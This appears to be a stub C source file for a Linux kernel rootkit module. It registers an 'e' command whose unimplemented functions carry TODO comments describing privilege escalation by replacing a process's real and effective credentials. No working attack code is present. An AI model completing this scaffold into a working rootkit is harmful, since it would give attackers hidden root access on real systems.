// SPDX-License-Identifier: GPL-2.0
#include "rootkit.h"
#include <linux/cred.h>
#include <linux/kernel.h>
#include <linux/pid.h>
#include <linux/rcupdate.h>
#include <linux/sched.h>
#include <linux/sched/task.h>

// TODO: locate a live task and replace its real and effective credentials.
static int rk_escalate_pid(pid_t pid)
{
	return -ENOSYS;
}

// TODO: no argument targets the parent shell; an argument targets that PID.
static int cmd_escalate(const char *arg)
{
	return -ENOSYS;
}

int rk_escalate_init(void)
{
	return rk_cmd_register("e", cmd_escalate);
}
